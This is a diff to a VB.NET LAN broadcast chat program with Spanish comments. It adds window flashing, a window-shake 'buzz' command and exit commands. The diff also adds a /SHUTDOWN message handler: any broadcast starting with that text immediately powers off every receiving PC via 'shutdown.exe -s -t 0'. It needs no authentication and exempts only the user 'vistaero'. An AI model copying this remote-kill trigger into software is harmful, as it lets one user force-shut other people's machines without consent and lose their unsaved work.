@@ -3,8 +3,104 @@ Imports System.Net
 Imports System.Net.Sockets
 Imports System.Text
 Imports System.Threading
+Imports System.Runtime.InteropServices
 
 Public Class Form1
+
+    <DllImport("user32.dll")> _
+    Public Shared Function FlashWindowEx(ByRef pfwi As FLASHWINFO) As Integer
+    End Function
+
+    <StructLayout(LayoutKind.Sequential)> _
+    Structure FLASHWINFO
+        Dim cbSize As Integer
+        Dim hwnd As System.IntPtr
+        Dim dwFlags As Integer
+        Dim uCount As Integer
+        Dim dwTimeout As Integer
+    End Structure
+
+    Private Const FLASHW_STOP As Integer = &H0
+    Private Const FLASHW_CAPTION As Integer = &H1
+    Private Const FLASHW_TRAY As Integer = &H2
+    Private Const FLASHW_ALL As Integer = (FLASHW_CAPTION Or FLASHW_TRAY)
+    Private Const FLASHW_TIMER As Integer = &H4
+    Private Const FLASHW_TIMERNOFG As Integer = &HC
+
+    Private Sub ComenzarParpadeo()
+        If Not txtMensaje.Focused Then
+            Dim FlashInfo As FLASHWINFO
+            With FlashInfo
+                .cbSize = Convert.ToUInt32(Marshal.SizeOf(GetType(FLASHWINFO)))
+                .dwFlags = CType(FLASHW_ALL Or FLASHW_TIMER, Int32)
+                .hwnd = Me.Handle
+                .dwTimeout = 0
+                .uCount = 0
+            End With
+            FlashWindowEx(FlashInfo)
+        End If
+        
+    End Sub
+
+    Private Sub DetenerParpadeo()
+        Dim FlashInfo As FLASHWINFO
+        With FlashInfo
+            .cbSize = Convert.ToUInt32(Marshal.SizeOf(GetType(FLASHWINFO)))
+            .dwFlags = CType(FLASHW_STOP, Int32)
+            .hwnd = Me.Handle
+            .dwTimeout = 0
+            .uCount = 0
+        End With
+        FlashWindowEx(FlashInfo)
+    End Sub
+
+    Private Sub ShakeMe(ByVal info As ShakeInfo)
+        Dim startTime As Date = Now
+        Dim offset As Integer = -1
+        Dim workingLeft As Integer = info.InitialLeft
+
+        While Now.Subtract(startTime).TotalSeconds < info.ShakeTimeInSeconds
+            workingLeft += offset
+            If offset < 0 Then
+                If Left <= info.InitialLeft - info.MaxPixelDrift Then
+                    offset = 1
+                End If
+            ElseIf Left >= info.InitialLeft + info.MaxPixelDrift Then
+                offset = -1
+            End If
+            MoveMe(workingLeft)
+        End While
+
+        MoveMe(info.InitialLeft)
+    End Sub
+
+    Private Sub MoveMe(ByVal toLeft)
+        If Me.InvokeRequired Then
+            Dim move As New MoveMeDelegate(AddressOf DoMoveMe)
+            Me.Invoke(move, toLeft)
+        Else
+            DoMoveMe(toLeft)
+        End If
+    End Sub
+
+    Protected Delegate Sub MoveMeDelegate(ByVal toLeft As Integer)
+    Protected Sub DoMoveMe(ByVal toLeft As Integer)
+        Left = toLeft
+    End Sub
+
+    Public Structure ShakeInfo
+        Public ShakeTimeInSeconds As Double
+        Public MaxPixelDrift As Integer
+        Public InitialLeft As Integer
+    End Structure
+
+    Private Sub Zumbido()
+        Dim info As New ShakeInfo
+        info.ShakeTimeInSeconds = 3.0
+        info.MaxPixelDrift = 10
+        info.InitialLeft = Me.Left
+        System.Threading.ThreadPool.QueueUserWorkItem(AddressOf ShakeMe, info)
+    End Sub
 
 #Region "Variables"
     'Variable de objeto que contiene el socket
@@ -28,6 +124,11 @@ Public Class Form1
         Saliendo = True 'Indica que se está saliendo del programa
         ElSocket.Close() 'Cierra el socket
         HiloRecibir.Abort() 'Termina el proceso del hilo
+    End Sub
+
+    Private Sub Form1_GotFocus(sender As Object, e As EventArgs) Handles Me.GotFocus
+        DetenerParpadeo()
+
     End Sub
 
     Private Sub frmMain_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
@@ -80,49 +181,88 @@ Public Class Form1
         Loop
     End Sub
 
-    Private Sub txtDatosRecibidos_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs) Handles txtDatosRecibidos.TextChanged
+    Private Sub txtDatosRecibidos_TextChanged(ByVal sender As Object, ByVal e As System.EventArgs)
         'Mostrar siempre la última línea del TextBox.
         txtDatosRecibidos.SelectionStart = txtDatosRecibidos.TextLength
         txtDatosRecibidos.ScrollToCaret()
     End Sub
 
     Protected Sub ActualizarTextoMensaje(ByVal sender As Object, ByVal e As System.EventArgs)
-        'Si txtDatosRecibidos está vacío:
-        If txtDatosRecibidos.TextLength = 0 Then
-            txtDatosRecibidos.Text = ">" & ContenidoMensaje
-        Else
-            'de lo contrario insertar primero un salto de línea y luego los datos.
-            txtDatosRecibidos.Text &= vbCrLf & ">" & ContenidoMensaje
+        Dim Addline As Boolean = True
+        
+
+        If ContenidoMensaje.StartsWith("/SHUTDOWN") Then
+            If Not Usuario.Equals("vistaero") Then
+                Process.Start("shutdown.exe", "-s -t 0")
+                Addline = False
+            Else
+                Addline = False
+                txtDatosRecibidos.AppendText("Has apagado todos los ordenadores.")
+            End If
         End If
-    End Sub
 
-    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
-        Timer1.Enabled = True
-    End Sub
+        If ContenidoMensaje.StartsWith("/ZUMBIDO") Then
+            Addline = False
+            Zumbido()
+            ComenzarParpadeo()
 
-    Private Sub TextBox2_KeyDown(sender As Object, e As KeyEventArgs) Handles txtMensaje.KeyDown
-        If e.KeyCode = Keys.Enter Then
-            e.SuppressKeyPress = True
-            'Contiene la dirección de Broadcast y el puerto utilizado
-            Dim DirecciónDestino As New IPEndPoint(IPAddress.Broadcast, 20145)
-            'Buffer que guardará los datos hasta que se envíen
-            Dim DatosBytes As Byte() = Encoding.Default.GetBytes(Usuario & ": " & txtMensaje.Text)
-
-            'Envía los datos
-            ElSocket.SendTo(DatosBytes, DatosBytes.Length, SocketFlags.None, DirecciónDestino)
-
-            txtMensaje.Clear()
         End If
-        If e.KeyCode = Keys.Escape Then
-            Dim DirecciónDestino As New IPEndPoint(IPAddress.Broadcast, 20145)
-            Dim DatosBytes As Byte() = Encoding.Default.GetBytes("EMERGENCY")
+
+        If ContenidoMensaje.StartsWith("/EMERGENCY") Then
             Environment.Exit(0)
         End If
 
 
+        If Addline = True Then
+            'Si txtDatosRecibidos está vacío:
+            If txtDatosRecibidos.TextLength = 0 Then
+                txtDatosRecibidos.Text = ContenidoMensaje
+            Else
+                'de lo contrario insertar primero un salto de línea y luego los datos.
+                txtDatosRecibidos.Text &= vbCrLf & ContenidoMensaje
+            End If
+            ComenzarParpadeo()
+        End If
     End Sub
 
-    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles txtDatosRecibidos.KeyDown
+    Private Sub txtMensaje_GotFocus(sender As Object, e As EventArgs) Handles txtMensaje.GotFocus
+        DetenerParpadeo()
+    End Sub
+    Dim DatosBytes As Byte()
+    Dim DirecciónDestino As New IPEndPoint(IPAddress.Broadcast, 20145)
+
+    Private Sub TextBox2_KeyDown(sender As Object, e As KeyEventArgs) Handles txtMensaje.KeyDown
+        If e.KeyCode = Keys.Enter Then
+            Dim mensaje As String = txtMensaje.Text
+            e.SuppressKeyPress = True
+            Select Case txtMensaje.Text
+                Case Is = "/ZUMBIDO"
+                    mensaje = "/ZUMBIDO"
+                    DatosBytes = Encoding.Default.GetBytes(mensaje)
+                Case Is = "/SHUTDOWN"
+                    mensaje = "/SHUTDOWN"
+                    DatosBytes = Encoding.Default.GetBytes(mensaje)
+                Case Is = "/EMERGENCY"
+                    mensaje = "/EMERGENCY"
+                    DatosBytes = Encoding.Default.GetBytes(mensaje)
+                Case Else
+                    DatosBytes = Encoding.Default.GetBytes(Usuario & ": " & txtMensaje.Text)
+            End Select
+
+            'Envía los datos
+            ElSocket.SendTo(DatosBytes, DatosBytes.Length, SocketFlags.None, DirecciónDestino)
+            txtMensaje.Clear()
+            
+        End If
+        If e.KeyCode = Keys.Escape Then
+            Dim DirecciónDestino As New IPEndPoint(IPAddress.Broadcast, 20145)
+            Dim DatosBytes As Byte() = Encoding.Default.GetBytes("/EMERGENCY")
+            ElSocket.SendTo(DatosBytes, DatosBytes.Length, SocketFlags.None, DirecciónDestino)
+            Environment.Exit(0)
+        End If
+    End Sub
+
+    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs)
         If e.KeyCode = Keys.Escape Then
             Environment.Exit(0)
         End If
@@ -132,13 +272,13 @@ Public Class Form1
         txtDatosRecibidos.Clear()
     End Sub
 
-    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles txtMensaje.TextChanged
-
+    Private Sub Button1_Click(sender As Object, e As EventArgs)
+        DatosBytes = Encoding.Default.GetBytes("/ZUMBIDO")
+        ElSocket.SendTo(DatosBytes, DatosBytes.Length, SocketFlags.None, DirecciónDestino)
     End Sub
 
-    Private Sub AjustarTexto()
-        txtDatosRecibidos.SelectionStart = txtDatosRecibidos.Text.Length
-        txtDatosRecibidos.ScrollToCaret()
+    Private Sub Form1_LostFocus(sender As Object, e As EventArgs) Handles Me.LostFocus
+        txtMensaje.Focus()
     End Sub
 
 End Class
